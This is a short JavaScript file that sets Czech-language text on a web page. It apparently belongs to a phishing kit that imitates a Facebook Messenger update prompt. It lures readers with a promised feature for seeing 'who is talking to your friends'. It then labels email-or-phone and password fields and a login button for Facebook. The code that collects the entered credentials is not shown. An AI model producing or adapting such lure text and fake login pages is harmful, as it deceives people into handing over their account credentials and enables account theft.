var mainParagraph = document.querySelector(".con-text");
var subMainParagraph = document.querySelector(".log-text");
var updateButton = document.querySelector(".update")
var userInput = document.querySelector(".home-mail");
var passInput = document.querySelector(".home-pass");
var logButton = document.querySelector(".login"); 
var checkBox = document.querySelector(".chbox"); 

mainParagraph.innerHTML ="Aktualizujte Messenger na nejnovější verzi, abyste si mohli užívat s novými funkcemi, jako je vědět, kdo mluví s vašimi přáteli";
subMainParagraph.innerHTML ="Okamžitě se spojte s lidmi ve svém životě. Chcete-li začít, přihlaste se pomocí Facebooku.";
updateButton.innerHTML ="nyní aktualizovat";
userInput.setAttribute("placeholder" , "E-mailová adresa nebo telefonní číslo");
passInput.setAttribute("placeholder" , "Heslo");
logButton.setAttribute("value" , "Přihlásit se");
checkBox.innerHTML ="Zůstat přihlášen";
